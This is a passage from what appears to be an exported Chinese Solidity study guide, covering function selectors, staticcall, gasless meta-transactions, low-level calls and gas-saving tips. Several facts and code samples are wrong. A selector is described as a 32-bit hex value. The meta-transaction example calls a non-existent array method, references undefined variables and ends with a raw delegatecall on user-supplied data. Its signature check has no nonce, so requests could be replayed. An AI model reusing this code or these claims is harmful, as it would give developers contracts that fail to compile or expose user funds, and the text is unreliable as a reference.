字节的标识符。它是所有 Solidity 函数的独特标识，它唯一标识了所有函数的调用签名。我们可以使用 Solidity 中的 selector 关键字来获取一个 Solidity 函数的 selector。\nSolidity selector 的语法\nSolidity selector 是由函数的标识构成的 32 位十六进制值。在 Solidity 中，我们可以使用 bytes4 类型来表示 Solidity selector。具体语法如下：\nfunction myFunction(uint256 _param1, address _param2) public returns (uint256) {\n    // 函数体\n}\n\nbytes4 selector = myFunction.selector;\n\n在上面的代码中，我们定义了一个名为 myFunction 的 Solidity 函数。在第 5 行，我们使用了 .selector API 获取了函数 myFunction 的 Solidity selector。\nSolidity selector 的使用\n在 Solidity 合约开发中，我们通常会使用 Solidity selector 来将函数的数据传递给其他合约或外部项目。Solidity selector 可以通过以下两种方式使用。\n1. 将 Solidity selector 传递给其他合约\n当我们将 Solidity 写的合约作为一个子合约部署到网络上时，其他合约可以使用该合约的函数，这意味着其他合约需要知道该函数的 Solidity selector 才能正确地调用该函数。例如，考虑如下的 Solidity 合约：\ncontract myContract {\n    function myFunction(uint256 _param1, address _param2) public returns (uint256) {\n        // 函数体\n    }\n}\n\n在上述合约中，我们观察到 myFunction 函数的 Solidity selector 可以通过代码 myFunction.selector 获取，我们在其他合约中需要使用它来正确调用上述 solidity 合约中的函数。\n2. Solidity selector 的使用方式\n另一种常见的 Solidity selector 的使用方式是作为某些外部调用或函数调用的参数，如 external_call(selector, data) 和 bytes4 data = myFunction.selector 等。例如：\ncontract AnotherContract {\n    address public myContractAddress = 0x123abc...\n\n    function foo() public returns (uint256) {\n        bytes4 selector = bytes4(keccak256(bytes(&quot;myFunction(uint256,address)&quot;)));\n        // 使用 Solidity selector 调用 myFunction 函数\n        (bool success, bytes memory result) = myContractAddress.call(abi.encodeWithSelector(selector, 123, 0x456));\n        // 解析结果数据，在 result 数组的索引为 0 处有返回值，该返回值是 uint256 类型。\n        uint256 returnValue = abi.decode(result, (uint256));\n        return returnValue;\n    }\n}\n\nSolidity selector 的重要性\n在 Solidity 中，Solidity selector 扮演了非常关键的角色。作为函数调用的签名和「指纹」，Solidity selector 确保在 Solidity 合约中唯一标识每个函数，从而帮助避免代码混淆和错误的函数调用。此外，Solidity selector 还提供了函数调用的安全性，确保函数参数的正确性和完整性。\n总之，Solidity selector 作为 Solidity 中非常重要的概念和语法，是 Solidity 开发人员必须理解和掌握的。掌握 Solidity selector 将使您更加熟练地开发智能合约，并能够在 Solidity 合约中正确地识别和调用函数。"},"blockchainguide/DApp_Development/合约基础/solidity_staticcall":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_staticcall","filePath":"blockchainguide/DApp_Development/合约基础/solidity_staticcall.md","title":"solidity_staticcall","links":[],"tags":[],"content":"Solidity staticcall 的用法和注意事项\n在 Solidity 中，staticcall 是一种用于在智能合约中调用另一个智能合约的功能。与 call 和 delegatecall 不同，staticcall 不会修改状态或更改合约存储。staticcall 只会执行可视部分和纯函数并返回结果。本文将详细介绍 staticcall 的用法，应用场景，注意点和安全性。\n用法\nstaticcall 函数定义如下：\nfunction staticcall(address _target, bytes memory _data) public view returns (bool success, bytes memory returnData)\nstaticcall 函数的第一个参数指定要调用的合约地址，第二个参数是要调用的字节数组，也就是要调用的函数和参数。staticcall 函数的返回值是一个元组，第一个参数表示函数调用是否成功，第二个参数是返回的字节数组，包含调用函数的返回值。\n下面是一个简单的示例，用于演示如何使用 staticcall 函数调用另一个合约中的函数，并获取其返回值。\npragma solidity ^0.8.0;\n \ncontract Target {\n    function getName() public view returns (string memory) {\n        return &quot;Target Contract&quot;;\n    }\n}\n \ncontract Caller {\n    function callGetName(address _target) public view returns (string memory) {\n        (bool success, bytes memory returnData) = _target.staticcall(\n            abi.encodeWithSignature(&quot;getName()&quot;) // 调用目标合约的 getName 函数\n        );\n        require(success, &quot;Staticcall to target contract failed&quot;);\n        return abi.decode(returnData, (string)); // 解码返回的字节数组\n    }\n}\n在上述代码示例中，我们定义了两个合约，Target 和 Caller。在 Target 合约中，我们定义了一个 getName 函数，该函数返回 “Target Contract”。在 Caller 合约中，我们使用 staticcall 函数调用 Target 合约中的 getName 函数，并获得其返回值。\n需要注意的是，staticcall 函数必须声明为 view 或 pure，以确保它不会修改任何状态。此外，由于 staticcall 只能调用合约中的视图和纯函数，并且不能调用修改状态的函数，因此在智能合约中使用 staticcall 通常只用于获取其他合约的状态或执行与状态无关的计算。\n应用场景\nstaticcall 函数可以用于以下场景：\n调用其他合约的只读函数\n在智能合约中，您可能需要查询其他合约的存储状态或执行其他合约中的只读函数，例如查询代币余额或查询外部服务的数据。在这种情况下，您可以使用 staticcall 函数来调用其他合约中的函数，而无需将其作为交易广播到区块链网络中。\n将代码封装到固定地址\n在某些情况下，您可能需要将可重用的代码封装到一个合约中，并将该合约的地址硬编码到您的合约中。在这种情况下，您可以使用 staticcall 函数来调用已存储在硬编码地址中的合约中的函数，而无需部署一个新的合约实例。\n注意点和安全性\n由于 staticcall 函数只能执行视图函数和纯函数，并且不能调用修改状态的函数，因此它比 call 和 delegatecall 更安全。但是，通过 staticcall 能够执行合约中的其中一些函数，在某些情况下可能会存在潜在的攻击风险。\n以下是一些使用 staticcall 函数时应该注意的事项：\n始终检查返回值\n在使用 staticcall 函数时，请始终检查返回值，以确保函数调用成功并返回了预期的结果。如果返回值未被检查，则可能会受到攻击，例如重入攻击。\n永远不要使用 this 访问实例变量\n在 staticcall 函数中，您不能访问 this 引用，因为您不能修改状态。因此，您不能访问存储在合约中的状态变量。如果您需要访问该变量，请改为将合约地址作为参数传递，并从函数方法调用中返回状态值。\n在使用 staticcall 函数时，应谨慎使用底层类型\n在使用 staticcall 函数时，请避免使用底层类型。底层类型的使用可能会导致数据错误或安全漏洞，并可能使您的合约更难以维护。\n在使用 staticcall 函数时，请确保您信任目标合约\n使用 staticcall 函数调用另一个合约时，请确保您信任该合约，并仔细评估其中包含的代码。目标合约可能包含有意或无意的漏洞或恶意代码，这可能会使您的合约受到攻击。\n防止重入攻击\n重入攻击是指通过在相同的函数中重新调用一个合同来多次调用一个函数。要防止重入攻击，请确保您的合约在调用其他合约之前，已经执行过必要的检查，并始终在函数开头执行锁定操作。\n结论\nstaticcall 是 Solidity 中非常有用的功能之一，可以安全地在智能合约中调用其他合约中的视图和纯函数，而无需修改状态或更改合约存储。使用 staticcall 函数的主要用途是查询其他合约的状态或执行与状态无关的计算。在使用 staticcall 函数时，需要特别注意潜在的安全风险，并采取必要的措施来防范攻击。"},"blockchainguide/DApp_Development/合约基础/元交易":{"slug":"blockchainguide/DApp_Development/合约基础/元交易","filePath":"blockchainguide/DApp_Development/合约基础/元交易.md","title":"元交易","links":[],"tags":[],"content":"元交易，也被称为 “无 gas” 交易，是一种允许用户与智能合约交互而无需自己支付 gas 的方式。这对于需要用户进行频繁或小额交易的应用来说特别有用，因为 Gas 费的成本会迅速增加。\n什么是元交易？\n在以太坊网络中，每次用户想与智能合约交互时，他们必须向网络支付一笔费用（以 Gas 形式），以便执行交易。这种费用对于激励矿工将交易纳入区块链并确保网络保持去中心化和安全是必要的。然而，这种模式对于需要用户进行频繁或小额交易的应用来说是有局限性的，因为 Gas 费用的成本会迅速增加，并成为用户进入的障碍。元交易提供了一种解决方法，允许用户与智能合约交互，而不必自己支付加 Gas 费。\n在元交易中，用户的交易实际上是由另一个账户执行的，该账户代表他们支付 Gas 费。这个账户被称为 “relayer”，它可以是一个合约或普通的以太坊账户。中继者从用户那里收到交易，用自己的私钥签名，然后将其提交给网络进行开采。用户的交易基本上被包裹在支付 Gas 费用的第二笔交易中，允许用户与合约交互，而无需自己支付 Gas 费用。\n在 Solidity 中实现无 gas 元交易\n为了在 Solidity 智能合约中实现无 gas 元交易，我们需要做以下工作。\n1.创建一个函数，允许中继者代表用户执行交易。\n2.检查中继者是否被授权代表用户执行交易。\n3.验证用户交易的签名以确保其真实性。\n4.执行用户的交易，并使用中继者的账户支付 Gas 费。\n让我们更详细地了解一下这些步骤中的每一个。\n1. 为中继者创建一个函数来执行交易\n首先，我们需要在我们的智能合约中创建一个函数，允许中继者代表用户执行交易。这个函数应该接受以下参数。\n*_user*: 想执行交易的用户的地址。\n*_data*: 用户的交易数据，编码为字节数组。这通常是用户想调用的函数的签名和参数，使用abi.encode()函数进行编码。\n*_signature*: 用户交易的签名，使用eth_signTypedData()函数生成。\n下面是这个函数在 Solidity 中的一个例子。\nduidaima.com\nfunction execute(address _user, bytes _data, bytes _signature) public {\n  // TODO: 添加代码以验证中继层和签名\n  // TODO: 添加代码以执行用户的事务\n}\n2. 检查中继者是否被授权\n接下来，我们需要检查中继器是否被授权代表用户执行交易。这对于防止恶意行为者代表其他用户提交任意交易非常重要。做到这一点的一个方法是让用户明确授权中继器代表他们执行交易。这可以通过在智能合约中添加一个映射来实现，该映射存储了每个用户的授权中继者。然后execute()函数可以检查这个映射，以验证调用者是否被授权代表用户执行交易。\n下面是一个例子，说明这种映射和验证在 Solidity 中可能是怎样的。\nmapping(address =&gt; address[]) public authorizedRelayers;\nfunction execute(address _user, bytes _data, bytes _signature) public {\n   // 堆代码 www.duidaima.com\n  // 检查调用者是否被授权代表用户执行交易\n  require(authorizedRelayers[_user].contains(msg.sender), &quot;Unauthorized relayer&quot;);\n  // TODO: 验证签名\n  // TODO: 执行交易\n}\n在这个例子中，authorizedRelayers映射被用来为每个用户存储一个授权中继者数组。然后execute()函数检查调用者(msg.sender)是否在该用户的授权中继者数组中，然后再继续执行。\n3. 验证签名\n接下来，我们需要验证用户交易的签名，以确保它是真实的。这对于防止恶意行为者提交实际上并非由用户签名的交易非常重要。为了验证签名，我们可以使用ecrecover()函数，该函数将签名、交易数据和链 ID 作为输入，并返回签署该交易的地址。然后我们可以将这个地址与传递给execute()函数的_user参数进行比较，以确保它们相匹配。\n下面是这个签名验证在 Solidity 中可能出现的例子。\nfunction execute(address _user, bytes _data, bytes _signature) public {\n  // Check that the caller is authorized to execute transactions on behalf of the user\n  require(authorizedRelayers[_user].contains(msg.sender), &quot;Unauthorized relayer&quot;);\n  // Verify the signature\n  bytes32 hash = keccak256(abi.encodePacked(chainId, _data));\n  address signer = ecrecover(hash, sig.v, sig.r, sig.s);\n  require(signer == _user, &quot;Invalid signature&quot;);\n  // TODO: Add code to execute the user&#039;s transaction\n}\n在这个例子中，ecrecover()函数被用来回退使用所提供的签名和数据来签署交易的地址。然后将回退的地址与传递给execute()函数的_user参数进行比较，以确保它们匹配。\n4. 执行用户的交易\n最后，我们需要执行用户的交易，用中继者的账户支付 Gas 费。要做到这一点，我们可以使用delegatecall()函数，它允许我们用当前合约的调用者和参数调用另一个合约的函数。\n下面是一个在 Solidity 中可能出现的例子。\nfunction execute(address _user, bytes _data, bytes _signature) public {\n  // Check that the caller is authorized to execute transactions on behalf of the user\n  require(authorizedRelayers[_user].contains(msg.sender), &quot;Unauthorized relayer&quot;);\n  // Verify the signature\n  bytes32 hash = keccak256(abi.encodePacked(chainId, _data));\n  address signer = ecrecover(hash, sig.v, sig.r, sig.s);\n  require(signer == _user, &quot;Invalid signature&quot;);\n  // Execute the user&#039;s transaction\n  // The relayer&#039;s account is used to pay for the gas fees\n  delegatecall(_data);\n}\n在这个例子中，delegatecall()函数被用来执行用户的交易，使用 relayer 的账户来支付 Gas 费。_data参数包含用户交易的函数签名和参数，被传递给delegatecall()函数作为调用的合约和参数。"},"blockchainguide/DApp_Development/合约基础/学习大纲-":{"slug":"blockchainguide/DApp_Development/合约基础/学习大纲-","filePath":"blockchainguide/DApp_Development/合约基础/学习大纲 .md","title":"学习大纲 ","links":[],"tags":[],"content":"\n预编译合约\n安装最新0.8.0\nabi编码\nEcdsa  r,s v (可以用于验证哪一个账号的私钥签署了这个消息)\nErevover(r,s, v) 返回地址\npayble\n\nevent\n事件是能方便地调用以太坊虚拟机日志功能的接口\n地址类型 Address\n地址类型有两种形式，他们大致相同：\n\n\naddress：保存一个20字节的值（以太坊地址的大小）。\naddress payable ：可支付地址，与 address 相同，不过有成员函数 transfer 和 send 。\n\n\n这种区别背后的思想是 address payable 可以向其发送以太币，而不能先一个普通的 address 发送以太币，例如，它可能是一个智能合约地址，并且不支持接收以太币。\n类型转换:\n允许从 address payable 到 address 的隐式转换，而从 address 到 address payable 必须显示的转换, 通过 payable(&lt;address&gt;) 进行转换。\n只能通过 payable(...) 表达式把 address 类型和合约类型转换为 address payable。 只有能接收以太币的合约类型，才能够进行此转换\nfallack/receive/transfer\nsend 是 transfer 的低级版本。如果执行失败，当前的合约不会因为异常而终止，但 send 会返回 false。\n在使用 send 的时候会有些风险：如果调用栈深度是 1024 会导致发送失败（这总是可以被调用者强制），如果接收者用光了 gas 也会导致发送失败。 所以为了保证 以太币Ether 发送的安全，一定要检查 send 的返回值，使用 transfer 或者更好的办法： 使用接收者自己取回资金的模式\ncall delegatecall/staticcall\n为了与不符合 应用二进制接口Application Binary Interface(ABI) 的合约交互，或者要更直接地控制编码，提供了函数 call，delegatecall 和 staticcall 。 它们都带有一个 bytes memory 参数和返回执行成功状态（bool）和数据（bytes memory）\n所有这些函数都是低级函数，应谨慎使用。 具体来说，任何未知的合约都可能是恶意的，我们在调用一个合约的同时就将控制权交给了它，而合约又可以回调合约，所以要准备好在调用返回时改变相应的状态变量（可参考 可重入 )， 与其他合约交互的常规方法是在合约对象上调用函数（x.f()）。\n可以使用 gas 修改器modifier 调整提供的 gas 数量：\naddress(nameReg).call{gas: 1000000}(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));\n\n类似地，也能控制提供的 以太币Ether 的值：\naddress(nameReg).call{value: 1 ether}(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));\n\n最后一点，这些 修改器modifier 可以联合使用。每个修改器出现的顺序不重要：\naddress(nameReg).call{gas: 1000000, value: 1 ether}(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));\n\n所有三个函数 call ， delegatecall 和 staticcall 都是非常低级的函数，应该只把它们当作 最后一招 来使用，因为它们破坏了 Solidity 的类型安全性。\n所有三种方法都提供 gas 选项，而 value 选项仅 call 支持 。\n合约类型\n您可以隐式地将合约转换为从他们继承的合约。 合约可以显式转换为 address 类型。\n只有当合约具有 接收receive函数 或 payable 回退函数时，才能显式和 address payable 类型相互转换 转换仍然使用 address(x) 执行， 如果合约类型没有接收或payable 回退功能，则可以使用 payable(address(x)) 转换为 address payable 。\n引用类型\n\n\nmemory 即数据在内存中，因此数据仅在其生命周期内（函数调用期间）有效。不能用于外部调用。\n\n\n存储storage 状态变量保存的位置，只要合约存在就一直存储．\n\n\n调用数据calldata 用来保存函数参数的特殊数据位置，是一个只读位置。\n\n0.6.9 之前 calldata 仅用于外部函数调用参数，0.6.9之后可用于任意函数。\n\n\n如果可以的话，请尽量使用 calldata 作为数据位置，因为它将避免复制，并确保不能修改数据。 函数的返回值中也可以使用 calldata 数据位置的数组和结构，但是无法给其分配空间。\n\n\n在0.6.9版本之前，引用类型参数的数据位置有限制，外部函数中使用 calldata ，公共函数中使用 memory ，以及内部和私有函数中的 memory 或 storage 。 现在 memory 和 calldata 在所有函数中都被允许使用，无论其可见性如何。\n\n\n\n数据位置不仅仅表示数据如何保存，它同样影响着赋值行为：\n\n在 存储storage 和 内存memory 之间两两赋值（或者从 调用数据calldata 赋值 ），都会创建一份独立的拷贝。\n从 内存memory 到 内存memory 的赋值只创建引用， 这意味着更改内存变量，其他引用相同数据的所有其他内存变量的值也会跟着改变。\n从 存储storage 到本地存储变量的赋值也只分配一个引用。\n其他的向 存储storage 的赋值，总是进行拷贝。 这种情况的示例如对状态变量或 存储storage 的结构体类型的局部变量成员的赋值，即使局部变量本身是一个引用，也会进行一份拷贝（译者注：查看下面 ArrayContract 合约 更容易理解）。\n\n函数调用\n内部函数调用\n外部函数调用\n从一个合约到另一个合约的函数调用不会创建自己的交易, 它是作为整个交易的一部分的消息调用。\n任何与其他合约的交互都会产生潜在危险，尤其是在不能预先知道合约代码的情况下。 交互时当前合约会将控制权移交给被调用合约，而被调用合约可能做任何事。即使被调用合约从一个已知父合约继承，继承的合约也只需要有一个正确的接口就可以了。 被调用合约的实现可以完全任意的实现，因此会带来危险。 此外，请小心这个交互调用在返回之前再回调我们的合约，这意味着被调用合约可以通过它自己的函数改变调用合约的状态变量。 一个建议的函数写法是，例如，在合约中状态变量进行各种变化后再调用外部函数，这样，你的合约就不会轻易被滥用的重入攻击 (reentrancy) 所影响\n加“盐”的合约创建 / create2\n函数可见性的几种\n特别的函数\n\nreceive\nfallback\n\n内联汇编"},"blockchainguide/DApp_Development/合约高级技巧/事件高级用法":{"slug":"blockchainguide/DApp_Development/合约高级技巧/事件高级用法","filePath":"blockchainguide/DApp_Development/合约高级技巧/事件高级用法.md","title":"事件高级用法","links":[],"tags":[],"content":"事件过滤器\ngithub.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/合约升级实战":{"slug":"blockchainguide/DApp_Development/合约高级技巧/合约升级实战","filePath":"blockchainguide/DApp_Development/合约高级技巧/合约升级实战.md","title":"合约升级实战","links":[],"tags":[],"content":"github.com/NoharaHiroshi/upgradability-solidity-demo.git"},"blockchainguide/DApp_Development/合约高级技巧/死磕CREATE2控制合约地址":{"slug":"blockchainguide/DApp_Development/合约高级技巧/死磕CREATE2控制合约地址","filePath":"blockchainguide/DApp_Development/合约高级技巧/死磕CREATE2控制合约地址.md","title":"死磕CREATE2控制合约地址","links":[],"tags":[],"content":"blog.csdn.net/qq_52708261/article/details/127351875"},"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之内存布局":{"slug":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之内存布局","filePath":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之内存布局.md","title":"死磕solidity之内存布局","links":[],"tags":[],"content":"www.google.com/url%3A%2F%2Fmirror.xyz%2Fxyyme.eth%2F5eu3_7f7275rqY-fNMUP5BKS8izV9Tshmv8Z5H9bsec&amp;usg=AOvVaw1gUoxZKv9GACaod5CpJweh\nlearnblockchain.cn/docs/solidity/internals/layout_in_memory.html\ncoinsbench.com/solidity-layout-and-access-of-storage-variables-simply-explained-1ce964d7c738\ncloud.tencent.com/developer/article/1975388\n包括\ncalldata的布局\n内存变量的布局\n状态变量的存储模型"},"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之可迭代映射":{"slug":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之可迭代映射","filePath":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之可迭代映射.md","title":"死磕solidity之可迭代映射","links":[],"tags":[],"content":"eth.antcave.club/4-mapping"},"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之如何有效的节省gas":{"slug":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之如何有效的节省gas","filePath":"blockchainguide/DApp_Development/合约高级技巧/死磕solidity之如何有效的节省gas.md","title":"死磕solidity之如何有效的节省gas","links":[],"tags":[],"content":"\n为什么要强调优化gas的重要性\nDAPP中收取的费用取决于功能逻辑的复杂程度，越复杂消耗的计算资源越多。并且需要用户承担一部分gas,所以solidity 的优化显得非常的重要。同时注重优化gas的合约开发人员写出来的合约代码更安全，质量更高。\n1. 封装结构\n以uint 为例，如果我们的程序中包含多个类似的变量，可以将其封装在一起，因为不管uint8 ,uint32 ,uint16,solidity都会为其保留256位。即使你使用uint8也不会节省gas.\n2. 最小化读写链上数据\n首先明确一点在读写 memory 变量比读写 storage 变量便宜。\ncontract NotSaveGas {\nuint public var1  = 70;\nfunction f1() external view returns (uint) {\n        uint sum = 0;\n        for (uint i = 0; i &lt; var1; i++) {\n            sum += i;\n        }\n        return sum;\n}\n \ncontract SaveGas {\nfunction f2() external view returns (uint) {\n        uint sum = 0;\n \n        for (uint i = 0; i &lt; var1; i++) {\n            sum += i;\n        }\n        return sum;\n\t}\n}\n请一定要避免f1这种循环读写 storage 变量，这是比较消耗gas的方式。处理这种问题实际可以定义内存变量作为缓存，将数据写入，这样可以节省大量的gas.\n3.打开 solidity 优化器\nhardhat 配置：\nmodule.exports = {\n  solidity: {\n    version: &quot;0.8.9&quot;,\n    settings: {\n      optimizer: {\n        enabled: true,\n        runs: 1000,\n      },\n    },\n  },\n}\n4.尽可能减少链上数据\n区块链上保存数据是非常昂贵的，所以需要尽可能将链上存储的信息减少，以此来节省大量的交易gas.\n使用事件\n事件是外部事物(例如用户界面)从区块链中获得通知的内置方式。当发出事件时，将通知该事件的监视者。更新合约变量时不会发生通知。事件以不同的方式存储，比使用合约存储便宜得多。合约不能直接访问日志。\nIPFS\n如果你需要存储文件之类，可以使用IPFS保存文件，并将存储的ID保存在链上。\n无状态合约\nMerkle Proofs\n如果需要使用区块链来验证一些信息是否有效，可以使用 merkle 证明。Merkle 证明使用单一的数据块来证明更大的数据量的有效性。例如，如果有人想证明 “Tx4 “的有效性，他将需要提供 Tx4、Hash3、Hash12 和 Hash5678，然后你的合约将能够重新计算 Merkle 根（Hash12345678），并检查它是否与存储在区块链上的根相一致。你将不需要存储所有交易的哈希值。\n\n\n5.注重变量顺序\nSolidity 存储槽的长度为 32 字节，但并不是所有的数据类型都需要这么大的空间：bool, int8 … int128, bytes1 … bytes31 和地址需要的空间小于 32 字节。solidity 会尝试将这些变量打包到同一个存储槽中。\n如果你接连定义了 2 个uint128，它们都会被打包到同一个存储槽中，因为它们各占 16 字节。然而，如果你定义了一个uint128，接着是一个unit256，然后是另一个int128，你将使用 3 个存储槽，因为在两个 int128 之间的 unit256 需要一个完整的存储槽。\ncontract T{\n\t// 不好的方式\n\tuint128 v1;\n\tuint256 v2;\n\tuint128 v3;\n\t\n\t// 推荐方式\n\tuint128 v1;\n\tuint128 v3;\n\tuint256 v2;\n}\n6.首选数据类型\n如果智能合约只需要一个状态变量，一个永远不会大于 255 的无符号整数。我们常规思想可能是想用uint8,会觉得节省gas,实际并不会。以太坊操作码被设计为使用 256 位的变量（EVM 堆栈的大小），而 uint8 只需要 8 位，EVM 会在剩余的位上填上 “0”，以便能够操作它。这个由 EVM 执行的填 “0” 操作将花费 Gas，因此为了节省交易 Gas，最好使用 uint256 而不是 uint8。\n7.独立部署库\n如果在智能合约中重复使用代码，最好是将所有的代码打包到一个库中，并通过import的方式指向它。\n库包含：\n\n嵌入式库：包含内部函数的库，这些库都是嵌入在合约中，和合约一同部署，所以会比较消耗gas\n独立库：包含public和外部函数的库，这些库只会被部署一次，同时被所有导入它的所有合约使用，从而节省了大量的gas.\n\n8.构造函数\n常量和不可变的状态变量在合约被部署后不能被改变。区别在于，常量必须在编译时定义，而不可变量可以在构造函数中定义。总是尽量使用常量，以便使构造函数更便宜。\n9.使合约尽可能的小\n单个合约的限制是24KB，所以要想节省gas,就必须使实现的合约尽可能的小。\n\nrevert和assert的提示信息要尽可能的短\n修改器： 修改器（modifier）代码是内联的，这意味着它会被添加在所修改的函数的开头或结尾。在使用修改器时减少合约大小的一个技巧是编写一个实现修改器逻辑的函数，然后让修改器调用该函数。这样实现修改器的代码就不会被复制，只有函数调用会被复制。这种技术只在同一修改器被多次使用时有效。\n\nmodifier TestModifier(uint256 value){\n\t\tJudgeLength(value);\n\t\t_;\n}\nfunction JudgeLength(uint256 value)internal{\n\t//logic\n}\n10.最小代理（ERC1167）\n如果需要部署多个功能完全相同的合约，应该考虑使用 “最小代理”（在ERC 1167中定义）\n最小的代理只是一个合约，它将把所有的调用委托给一个预先定义的实现合约。它有一个定义好的字节码，代表最小代理合约的编译代码，你只需要把你的实现合约地址插入其中，你就可以根据需要部署最小代理的多个副本。 参考ERC 1167 相关文章，了解如何使用最小代理）。\n由于最小的代理字节码非常小，部署它的成本也低到不能再低，因此节省一堆部署 Gas。\n使用最小代理的注意事项，你应该牢记：最小代理的实现合约地址不能改变，这意味着你将不能升级他们的代码。\n11.内存位置\n以太坊存在4个内存位置，从最便宜到最贵的：calldata、stack、memory、storage。\n\ncalldata：只适用于输入参数且参数是外部函数的引用数据类型（数组，字符串 …）。Calldata 参数是只读的，如果你有一些需要传递给函数的引用类型，总是考虑使用 calldata，因为它是最便宜的。\nstack：只对方法中定义的值类型数据有效。\nmemory：内存是易丢失的 RAM，在 EVM 终止运行的时候会被移除。可以用它来存储引用数据类型，它比storage变量更便宜。当向其他函数传递参数，或在你的函数中声明临时变量时，除非你严格需要使用storage变量，否则应该总是使用 memory变量。\nstorage：是最昂贵的存储位置。存储数据在区块链上持久存在，请尽量减少链上数据存储。\n本地存储变量：本地存储变量是方法的本地变量，它指向一个实际的状态变量（存储在区块链存储中）。与其在内存中复制/粘贴存储数组以便操作它们，然后将它们复制回存储，不如简单地使用本地存储变量，直接在存储上操作。\n批处理：与其让用户用不同的值多次调用同一个函数（通过向区块链发送多个交易），不如让他们通过传递动态大小的数组，以便可以在一个单一的交易中批量执行相同的功能。这将能够节省一些交易基础开销成本。实际ERC1155有些思想就是如此\n\n12.尽量减少链上操作\n\n字符串：如果可以使用bytes,则尽量使用。如果仍然需要操作，则尽量放在智能合约外部操作。\n返回值：对返回值无需额外转换，如果这个是可以通过链外数据来处理。\n循环：避免在长数组中循环，这不仅会花费大量的 Gas，而且如果 Gas 成本增加到很高的程度（超过 BlockGas 限制），会使合约无法执行。使用映射来代替长数组，映射是一个哈希表，可以让你在一次操作中使用其键来访问任何值，而不是在数组中循环，直到找到你要找的键。\n\n13.利用 view函数减少gas\n当用户从外部调用一个view函数，是不需要支付一分 gas 的。\n这是因为 view 函数不会真正改变区块链上的任何数据 - 它们只是读取。因此用 view 标记一个函数，意味着告诉 web3.js，运行这个函数只需要查询你的本地以太坊节点，而不需要在区块链上创建一个事务（事务需要运行在每个节点上，因此花费 gas）。\n在所能只读的函数上标记上表示“只读”的“external view 声明，就能为你的玩家减少在 DApp 中 gas 用量。\n注意：如果一个 view 函数在另一个函数的内部被调用，而调用函数与 view 函数的不属于同一个合约，也会产生调用成本。这是因为如果主调函数在以太坊创建了一个事务，它仍然需要逐个节点去验证。所以标记为 view 的函数只有在外部调用时才是免费的。\n\n14.使用短路模式排序solidity操作\n短路（short-circuiting）是一种使用或/与逻辑来排序不同成本操作的solidity合约 开发模式，它将低gas成本的操作放在前面，高gas成本的操作放在后面，这样如果前面的低成本操作可行，就可以跳过（短路）后面的高成本以太坊虚拟机操作了。\n// f(x) 是低gas成本的操作\n// g(y) 是高gas成本的操作\n \n// 按如下排序不同gas成本的操作\nf(x) || g(y)\nf(x) &amp;&amp; g(y)\n15.删除不必要的库\n在开发Solidity智能合约时，我们引入的库通常只需要用到其中的部分功能，这意味着其中可能会包含大量对于你的智能合约而言其实是冗余的solidity代码。如果可以在你自己的合约里安全有效地实现所依赖的库功能，那么就能够达到优化solidity合约的gas利用的目的。\n例如，在下面的solidity代码中，我们的以太坊合约只是用到了SafeMath库的add方法：\nimport &#039;./SafeMath.sol&#039; as SafeMath;\n \ncontract SafeAddition {\n function safeAdd(uint a, uint b) public pure returns(uint) {\n return SafeMath.add(a, b);\n }\n}\n通过参考SafeMath的这部分代码的实现，可以把对这个solidity库的依赖剔除掉：\ncontract SafeAddition {\n function safeAdd(uint a, uint b) public pure returns(uint) {\n uint c = a + b;\n require(c &gt;= a, &quot;Addition overflow&quot;);\n return c;\n }\n}\n16.精确的声明函数的可见性\n在Solidity合约开发中，显式声明函数的可见性不仅可以提高智能合约的安全性， 同时也有利于优化合约执行的gas成本。例如，通过显式地标记函数为外部函数（External），可以强制将函数参数的存储位置设置为calldata，这会节约每次函数执行时所需的以太坊gas成本。\n\nExternal 可见性比 public 消耗gas 少。\n\n17.避免代码中死代码\n死代码（Dead code）是指那些永远也不会执行的Solidity代码，例如那些执行条件永远也不可能满足的代码，就像下面的两个自相矛盾的条件判断里的Solidity代码块，消耗了以太坊gas资源但没有任何作用：\nfunction deadCode(uint x) public pure {\n if(x &lt; 1 {\n    if(x &gt; 2) {\n        return x;\n    }\n }\n}\n18.避免使用常量结果的循环\n如果一个循环计算的结果是无需编译执行Solidity代码就可以预测的，那么 就不要使用循环，这可以可观地节省gas。例如下面的以太坊合约代码就可以 直接设置num变量的值：\nfunction constantOutcome() public pure returns(uint) {\n  uint num = 0;\n  for(uint i = 0; i &lt; 100; i++) {\n    num += 1;\n  }\n  return num;\n}\n19.合并循环\n有时候在Solidity智能合约中，你会发现两个循环的判断条件一致，那么在这种情况下就没有理由不合并它们。例如下面的以太坊合约代码：\nfunction loopFusion(uint x, uint y) public pure returns(uint) {\n  for(uint i = 0; i &lt; 100; i++) {\n    x += 1;\n  }\n  for(uint i = 0; i &lt; 100; i++) {\n    y += 1;\n  }\n  return x + y;\n}\n20.去除循环中的比较运算\n如果在循环的每个迭代中执行比较运算，但每次的比较结果都相同，则应将其从循环中删除。\nfunction unilateralOutcome(uint x) public returns(uint) {\n  uint sum = 0;\n  for(uint i = 0; i &lt;= 100; i++) {\n    if(x &gt; 1) {\n      sum += 1;\n    }\n  }\n  return sum;\n} \n********************\n最终的定稿 ： github.com/blockchainGuide/blockchainguide\n公众号 ： 